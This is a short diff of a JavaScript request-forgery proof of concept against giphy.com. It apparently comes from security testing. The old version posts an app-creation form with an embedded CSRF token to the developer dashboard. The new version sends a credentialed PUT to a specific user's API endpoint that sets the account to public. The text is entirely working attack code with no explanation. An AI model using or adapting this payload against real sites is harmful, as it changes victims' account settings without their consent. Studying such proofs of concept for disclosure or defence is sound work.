@@ -9,7 +9,7 @@ var xhr = new XMLHttpRequest();
         }
     };
     xhr.withCredentials = true;
-    xhr.open("post", "https://developers.giphy.com/dashboard/", true);
+    xhr.open("put", "https://giphy.com/api/v1/users/38283249/", true);
     xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 
-    xhr.send("csrfmiddlewaretoken=dxC5WWVAbG2MnFfLHY0d1pUmT4EKHUiSgTBVu6AAy6rW734F6UgtCx7kOp7mEXBe&name=gg&description=dddoo&sdk=false&terms=true");
+    xhr.send("is_public=true");
